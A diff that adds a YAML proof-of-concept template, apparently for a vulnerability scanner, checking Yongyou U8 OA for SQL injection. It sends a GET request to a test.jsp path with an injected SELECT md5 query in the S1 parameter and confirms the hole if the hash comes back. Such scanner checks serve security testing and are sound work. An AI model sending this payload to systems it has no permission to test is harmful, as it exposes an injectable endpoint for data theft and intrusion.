@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-u8-oa-sqli
+info:
+  name: Yongyou U8 Oa SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Yongyou
+  reference: []
+  description: null
+variables:
+  rand: random_int(100000, 900000)
+transport: http
+requests:
+- method: GET
+  path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{.rand}}))
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(rand))
+  output: []
